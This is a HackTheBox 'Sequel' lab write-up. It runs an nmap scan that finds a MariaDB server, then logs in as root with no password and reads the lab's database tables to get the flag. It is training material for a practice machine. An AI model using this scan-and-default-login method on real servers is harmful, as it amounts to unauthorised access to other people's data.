## Reconnaissance

Kicking off with a simple Nmap scan...

__Nmap Scan__
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/sequel]
└─$ sudo nmap -sC -sV -oN nmap.txt 10.129.94.61
Nmap scan report for 10.129.94.61
Host is up (0.021s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_sslv2: ERROR: Script execution failed (use -d to debug)
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 66
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsTransactions, SupportsLoadDataLocal, Speaks41ProtocolOld, InteractiveClient, DontAllowDatabaseTableColumn, LongColumnFlag, IgnoreSigpipes, Speaks41ProtocolNew, FoundRows, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, ODBCClient, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: v`]3#Ubp*|Vy~/jLy@p5
|_  Auth Plugin Name: mysql_native_password
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 17 20:29:33 2022 -- 1 IP address (1 host up) scanned in 212.46 seconds
```

There was SQL server running on the machine and we can connect to the SQL server with the `root` user without password to retrive the flag.

```sql
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/sequel]
└─$ mysql -h 10.129.94.61 -u root
...
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.019 sec)

MariaDB [(none)]> USE htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.017 sec)

MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | edited                           |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.016 sec)
```

You can retrieve the `flag` from the `flag` parameter of the `config` table to complete the task.
